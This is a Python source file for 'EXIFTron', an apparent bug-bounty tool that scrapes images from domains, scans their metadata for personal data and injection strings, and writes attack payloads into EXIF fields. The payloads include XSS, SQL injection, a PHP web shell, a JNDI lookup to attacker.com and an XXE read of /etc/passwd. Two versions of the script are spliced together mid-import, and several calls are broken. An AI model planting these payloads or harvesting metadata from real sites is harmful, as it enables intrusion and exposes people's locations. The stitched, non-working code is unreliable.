#!/usr/bin/env python3
import os
import sys
import json
import argparse
import subprocess
import requests
import shutil
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup#!/usr/bin/env python3
import os
import re
import sys
import argparse
import subprocess
import json
import requests
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

# Try to import Flask for dashboard mode; if not installed, dashboard mode won’t work.
try:
    from flask import Flask, render_template_string
except ImportError:
    Flask = None

# UI Setup for CLI output
console = Console()
ROOT = Path(__file__).parent.resolve()
DOWNLOAD_DIR = ROOT / "downloaded_images"

# Global configuration for Groq AI (if using AI analysis for PoC)
GROQ_API_KEY = "YOUR_GROQ_API_KEY"  # Replace with your Groq API Key

# --- Configuration for fields and patterns ---
TARGET_FIELDS = [
    "File Name", "Artist", "Copyright", "Comment", "Software", "Make", "Model",
    "Owner Name", "User Comment", "Author", "Description", "Keywords", "Title",
    "GPS Latitude", "GPS Longitude"
]

VULN_PATTERNS = {
    "XSS": [r"<script>", r"onerror=", r"javascript:"],
    "SQLi": [r"' OR 1=1 --", r"SELECT .* FROM", r"INSERT INTO", r"DROP TABLE"],
    "RCE": [r"<?php", r"system\(", r"cmd.exe", r"bash -c"],
    "LDAP Injection": [r"\$\{jndi:", r"ldap://"],
    "Secrets": [r"API_KEY", r"token", r"password", r"session"],
    "XXE": [r"<!ENTITY", r"file:///"],
    "SSTI": [r"\{\{.*?\}\}", r"\{\%.*?\%\}"],
    "Hardcoded Credentials": [r"username=", r"password="]
}

PII_PATTERNS = {
    "Email": [r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+"],
    "Phone Number": [r"\+?\d{1,3}[-.\s]?\(?\d{2,4}\)?[-.\s]?\d{3,4}[-.\s]?\d{4}"],
    "GPS Data": [r"(\d{1,2}°\s*\d{1,2}'\s*\d{1,2}.\d+\" [NS]),\s*(\d{1,3}°\s*\d{1,2}'\s*\d{1,2}.\d+\" [EW])"],
    "Username": [r"User[-\s]?[Nn]ame:\s*(\w+)"],
    "Password": [r"Password:\s*(\S+)"],
}

INJECTION_PAYLOADS = {
    "XSS": '<script>alert("XSS")</script>',
    "SQLi": "' OR 1=1 --",
    "RCE": "<?php system($_GET['cmd']); ?>",
    "LDAP": "${jndi:ldap://attacker.com}",
    "XXE": "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"
}

# --- EXIFTron Class Definition ---
class EXIFTron:
    def __init__(self):
        self.payloads = INJECTION_PAYLOADS
        self.report_data = []  # List of dictionaries with scan results

    def show_banner(self):
        banner = Panel(
            "🛡️ EXIFTron - **Ultimate EXIF Exploitation Framework**\n"
            "**Version**: 5.4 (Bug Bounty Edition) | **Author**: @Kdairatchi",
            style="bold blue"
        )
        console.print(banner)

    def extract_exif_data(self, image_path):
        """Extract EXIF metadata using exiftool and grep for precise parsing."""
        try:
            cmd = f'exiftool "{image_path}" | grep -E "{ "|".join(TARGET_FIELDS) }"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout.strip()
            exif_data = {}
            for line in result.split("\n"):
                if ": " in line:
                    key, value = line.split(": ", 1)
                    exif_data[key.strip()] = value.strip()
            # Use 'Author' if present; otherwise fall back to 'Artist'
            exif_data["Author"] = exif_data.get("Author") or exif_data.get("Artist", "N/A")
            return exif_data
        except Exception as e:
            console.print(f"[bold red]Error extracting EXIF: {e}[/bold red]")
            return None

    def analyze_vulnerabilities(self, metadata):
        """Check extracted metadata for known vulnerability patterns."""
        findings = []
        for field, content in metadata.items():
            for vuln_type, patterns in VULN_PATTERNS.items():
                if any(re.search(pattern, content, re.IGNORECASE) for pattern in patterns):
                    findings.append(f"{vuln_type} ({field})")
        return findings

    def detect_pii(self, metadata):
        """Detect personally identifiable information (PII) in metadata."""
        pii_findings = []
        for field, content in metadata.items():
            for pii_type, patterns in PII_PATTERNS.items():
                for pattern in patterns:
                    match = re.search(pattern, content, re.IGNORECASE)
                    if match:
                        pii_findings.append(f"{pii_type} ({field}): {match.group(0)}")
        return pii_findings

    def format_gps(self, lat, lon):
        """Format GPS coordinates and generate a Google Maps link."""
        if lat == "N/A" or lon == "N/A":
            return "N/A", "N/A"
        try:
            formatted_lat = lat.replace(" deg ", "°").replace("'", "′").replace("\"", "″")
            formatted_lon = lon.replace(" deg ", "°").replace("'", "′").replace("\"", "″")
            map_link = f"https://www.google.com/maps?q={quote(formatted_lat)},{quote(formatted_lon)}"
            return f"{formatted_lat}, {formatted_lon}", map_link
        except Exception:
            return "N/A", "N/A"

    def inject_payload(self, image_path, payload_type, field="Comment"):
        """Inject a payload into an image's EXIF metadata."""
        if payload_type not in self.payloads:
            console.print("[bold red]Invalid payload type![/bold red]")
            return
        payload = self.payloads[payload_type]
        console.print(f"[bold yellow]Injecting {payload_type} payload into {image_path} (field: {field})...[/bold yellow]")
        cmd = f'exiftool -{field}="{payload}" -overwrite_original "{image_path}"'
        subprocess.run(cmd, shell=True)

    def process_image(self, image_path):
        """Process a single image: extract EXIF, analyze vulnerabilities & PII, and prepare PoC data."""
        metadata = self.extract_exif_data(image_path)
        if not metadata:
            return None
        vulnerabilities = self.analyze_vulnerabilities(metadata)
        pii_data = self.detect_pii(metadata)
        return {
            "File": image_path.name,
            "Vulnerabilities": ", ".join(vulnerabilities) if vulnerabilities else "None",
            "PII": ", ".join(pii_data) if pii_data else "None",
            "GPS": f'{metadata.get("GPS Latitude", "N/A")}, {metadata.get("GPS Longitude", "N/A")}',
            "Map Link": f'https://www.google.com/maps?q={metadata.get("GPS Latitude", "")},{metadata.get("GPS Longitude", "")}' if metadata.get("GPS Latitude") != "N/A" else "N/A",
            "Name": metadata.get("Author", "N/A"),
            "Software": metadata.get("Software", "N/A"),
            "Permissions": metadata.get("File Permissions", "N/A")
        }

    def batch_process(self, folder_path):
        """Batch process all images in a folder using parallel execution."""
        image_files = list(Path(folder_path).glob("*.jpg")) + \
                      list(Path(folder_path).glob("*.jpeg")) + \
                      list(Path(folder_path).glob("*.png"))
        if not image_files:
            console.print("[bold red]❌ No images found in the specified folder![/bold red]")
            return []
        console.print(f"[bold green]🔍 Processing {len(image_files)} images in batch mode...[/bold green]")
        results = []
        with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
            for result in executor.map(self.process_image, image_files):
                if result:
                    results.append(result)
        return results

    def generate_report(self, results):
        """Generate a structured bug bounty EXIF security report."""
        table = Table(title="📄 Bug Bounty EXIF Security Report", show_lines=True)
        table.add_column("File", style="cyan")
        table.add_column("Vulnerabilities", style="red")
        table.add_column("PII Found", style="yellow")
        table.add_column("GPS Coordinates", style="green")
        table.add_column("Map Link", style="blue")
        table.add_column("Name", style="magenta")
        table.add_column("Software", style="yellow")
        table.add_column("Permissions", style="bold")

        for res in results:
            table.add_row(
                res["File"],
                res["Vulnerabilities"],
                res["PII"],
                res["GPS"],
                res["Map Link"],
                res["Name"],
                res["Software"],
                res["Permissions"]
            )
        console.print(table)
        with open("exif_scan_results.txt", "w") as f:
            for res in results:
                f.write(f'{res["File"]} | {res["Vulnerabilities"]} | {res["PII"]} | {res["GPS"]} | {res["Map Link"]} | {res["Name"]} | {res["Software"]} | {res["Permissions"]}\n')
        console.print("[bold green]✅ Scan completed. Results saved to exif_scan_results.txt[/bold green]")

# --- Dashboard Integration using Flask ---
def start_dashboard(results, host="0.0.0.0", port=5000):
    if not Flask:
        console.print("[bold red]Flask is not installed. Dashboard mode unavailable.[/bold red]")
        sys.exit(1)
    app = Flask(__name__)

    # Simple HTML template for the dashboard
    template = """
    <!doctype html>
    <html>
    <head>
        <title>EXIFTron Bug Bounty Dashboard</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            table { border-collapse: collapse; width: 100%; }
            th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
            th { background-color: #f2f2f2; }
        </style>
    </head>
    <body>
        <h1>EXIFTron Bug Bounty Dashboard</h1>
        <table>
            <thead>
                <tr>
                    <th>File</th>
                    <th>Vulnerabilities</th>
                    <th>PII Found</th>
                    <th>GPS Coordinates</th>
                    <th>Map Link</th>
                    <th>Name</th>
                    <th>Software</th>
                    <th>Permissions</th>
                </tr>
            </thead>
            <tbody>
                {% for res in results %}
                <tr>
                    <td>{{ res["File"] }}</td>
                    <td>{{ res["Vulnerabilities"] }}</td>
                    <td>{{ res["PII"] }}</td>
                    <td>{{ res["GPS"] }}</td>
                    <td>{% if res["Map Link"] != "N/A" %}<a href="{{ res["Map Link"] }}" target="_blank">View Map</a>{% else %}N/A{% endif %}</td>
                    <td>{{ res["Name"] }}</td>
                    <td>{{ res["Software"] }}</td>
                    <td>{{ res["Permissions"] }}</td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </body>
    </html>
    """

    @app.route("/")
    def dashboard():
        return render_template_string(template, results=results)

    console.print(f"[bold green]Starting dashboard on http://{host}:{port}[/bold green]")
    app.run(host=host, port=port)

def main():
    tool = EXIFTron()
    tool.show_banner()

    parser = argparse.ArgumentParser(description="EXIFTron: Ultimate Bug Bounty EXIF Scanner, Exploiter & PoC Generator")
    parser.add_argument("-i", "--image", help="Path to an image file")
    parser.add_argument("-u", "--url", help="Extract EXIF from an image URL")
    parser.add_argument("-d", "--domain", help="Scan an entire domain for images with EXIF metadata")
    parser.add_argument("-w", "--wayback", action="store_true", help="Extract images from Wayback Machine")
    parser.add_argument("-b", "--batch", help="Batch process all images in a folder")
    parser.add_argument("-e", "--extract", action="store_true", help="Extract EXIF data")
    parser.add_argument("-c", "--clean", action="store_true", help="Remove EXIF metadata")
    parser.add_argument("-g", "--gps", action="store_true", help="Extract GPS coordinates and map link")
    parser.add_argument("-r", "--reverse", action="store_true", help="Perform reverse image search")
    parser.add_argument("-a", "--attack", action="store_true", help="Automate EXIF-based attacks")
    parser.add_argument("-p", "--payload", help="Inject a payload into EXIF metadata (e.g. XSS, SQLi, RCE, LDAP, XXE)")
    parser.add_argument("-f", "--field", default="Comment", help="EXIF field to inject payload (default: Comment)")
    parser.add_argument("-report", "--report", action="store_true", help="Generate a full EXIF security report")
    parser.add_argument("--dashboard", action="store_true", help="Launch web dashboard to view results")

    args = parser.parse_args()
    results = []

    # Single image scan
    if args.image:
        res = tool.process_image(Path(args.image))
        if res:
            results.append(res)
    # Batch processing
    elif args.batch:
        results = batch_process(args.batch)
    # URL, domain, wayback, etc. could be implemented in future versions

    # If payload injection is requested, perform injection (only on single image for now)
    if args.payload and args.image:
        tool.inject_payload(Path(args.image), args.payload, args.field)
        # Optionally re-scan the image after injection:
        res = tool.process_image(Path(args.image))
        if res:
            results = [res]

    # If report flag is set (or if in CLI mode and results exist), generate CLI report
    if results and not args.dashboard:
        tool.generate_report(results)

    # If dashboard flag is set, launch the web dashboard with the results
    if args.dashboard:
        if results:
            start_dashboard(results)
        else:
            console.print("[bold red]No results to display on dashboard.[/bold red]")

if __name__ == "__main__":
    main()

from PIL import Image
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress
from rich.table import Table
from rich.markdown import Markdown
from urllib.parse import urlparse, urljoin

# UI Configuration
console = Console()
error_console = Console(stderr=True, style="bold red")
ROOT = Path(__file__).parent.resolve()
DOWNLOAD_DIR = ROOT / "downloaded_images"

class EXIFTron:
    def __init__(self):
        self.payloads = {
            'xss': ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'],
            'sqli': ["' OR 1=1 --", '" OR "1"="1'],
            'rce': ['<?php system($_GET["cmd"]); ?>', '<?=`$_GET[0]`?>'],
            'xxe': ['<!ENTITY xxe SYSTEM "file:///etc/passwd">']
        }
        self.report_data = []

    def show_banner(self):
        banner = Markdown("""
        # 🛡️ EXIFTron - Ultimate EXIF Exploitation Framework
        **Version**: 4.0 | **Author**: @Kdairatchi
        """)
        console.print(Panel(banner, style="bold blue"))

    def check_dependencies(self):
        required = {
            'exiftool': 'exiftool',
            'waybackurls': 'waybackurls',
            'waymore': 'waymore',
            'ffmpeg': 'ffmpeg'
        }
        missing = []
        for name, cmd in required.items():
            if not shutil.which(cmd):
                missing.append(name)
        return missing

    def generate_image(self, payload_type):
        img_path = ROOT / f"payload_{payload_type}.jpg"
        Image.new('RGB', (800, 800), color='red').save(img_path)

        with Progress() as progress:
            task = progress.add_task("[cyan]Injecting payloads...", total=4)
            for field in ['Comment', 'Artist', 'Copyright', 'Software']:
                subprocess.run([
                    'exiftool',
                    f'-{field}={self.payloads[payload_type][0]}',
                    '-overwrite_original',
                    str(img_path)
                ], capture_output=True)
                progress.update(task, advance=1)
        return img_path

    def download_image(self, url):
        try:
            os.makedirs(DOWNLOAD_DIR, exist_ok=True)
            file_name = os.path.basename(urlparse(url).path)
            file_path = DOWNLOAD_DIR / file_name
            
            response = requests.get(url, stream=True)
            if response.status_code == 200:
                with open(file_path, "wb") as f:
                    for chunk in response.iter_content(1024):
                        f.write(chunk)
                return file_path
            else:
                return None
        except Exception as e:
            error_console.print(f"Download failed: {e}")
            return None

    def harvest_urls(self, domain):
        console.print(f"[bold green]🚀 Harvesting URLs for {domain}...[/bold green]")
        urls = []

        try:
            wayback = subprocess.run(['waybackurls', domain], capture_output=True, text=True)
            urls.extend(wayback.stdout.splitlines())

            waymore = subprocess.run(['waymore', '-i', domain], capture_output=True, text=True)
            urls.extend(waymore.stdout.splitlines())
        except Exception as e:
            error_console.print(f"Wayback extraction error: {e}")

        return urls

    def batch_scan(self, file_list):
        with open(file_list, 'r') as f:
            urls = [line.strip() for line in f.readlines()]
        self.mass_scan(urls)

    def mass_scan(self, domain, workers=10):
        console.print(f"[bold yellow]🔍 Starting mass scan of {domain}[/bold yellow]")
        urls = self.harvest_urls(domain)
        image_urls = [u for u in urls if u.lower().endswith(('.jpg', '.jpeg', '.png'))]

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = {executor.submit(self._scan_url, url): url for url in image_urls}

            with Progress() as progress:
                task = progress.add_task("Scanning URLs", total=len(futures))
                for future in futures:
                    future.add_done_callback(lambda _: progress.update(task, advance=1))

        self.generate_report()

    def _scan_url(self, url):
        try:
            image_path = self.download_image(url)
            if not image_path:
                return None

            metadata = subprocess.run(
                ['exiftool', '-j', str(image_path)],
                capture_output=True,
                text=True
            )

            return json.loads(metadata.stdout)[0]
        except Exception as e:
            return {'error': str(e)}

    def generate_report(self):
        table = Table(title="📊 Scan Results", show_header=True, header_style="bold magenta")
        table.add_column("URL", style="cyan")
        table.add_column("Vulnerabilities", style="red")
        table.add_column("GPS Data", style="green")

        for entry in self.report_data:
            vulns = []
            if entry.get('xss'):
                vulns.append("XSS")
            if entry.get('sqli'):
                vulns.append("SQLi")

            table.add_row(
                entry['url'],
                ", ".join(vulns) if vulns else "None",
                entry.get('GPS', 'N/A')
            )

        console.print(Panel(table, title="Final Report"))

if __name__ == "__main__":
    tool = EXIFTron()

    parser = argparse.ArgumentParser(description="EXIFTron: Automated EXIF Exploitation Framework")
    parser.add_argument("-i", "--image", help="Path to the image file")
    parser.add_argument("-u", "--url", help="Extract EXIF from an image URL")
    parser.add_argument("-d", "--domain", help="Scan an entire domain for images with EXIF metadata")
    parser.add_argument("-w", "--wayback", action="store_true", help="Extract images from Wayback Machine")
    parser.add_argument("-b", "--batch", help="Batch process all images in a folder")
    parser.add_argument("-e", "--extract", action="store_true", help="Extract EXIF data")
    parser.add_argument("-c", "--clean", action="store_true", help="Remove EXIF metadata")
    parser.add_argument("-g", "--gps", action="store_true", help="Extract GPS coordinates and map link")
    parser.add_argument("-r", "--reverse", action="store_true", help="Perform reverse image search")
    parser.add_argument("-a", "--attack", action="store_true", help="Automate EXIF-based attacks")
    parser.add_argument("-p", "--payload", help="Inject a payload into EXIF metadata")
    parser.add_argument("-f", "--field", default="Comment", help="EXIF field to inject payload (default: Comment)")
    parser.add_argument("-report", "--report", action="store_true", help="Generate a full EXIF security report")

    args = parser.parse_args()

    if args.wayback and args.domain:
        tool.mass_scan(args.domain)
    elif args.domain:
        tool.mass_scan(args.domain)
    elif args.image:
        tool.extract_exif(args.image)
    else:
        parser.print_help()
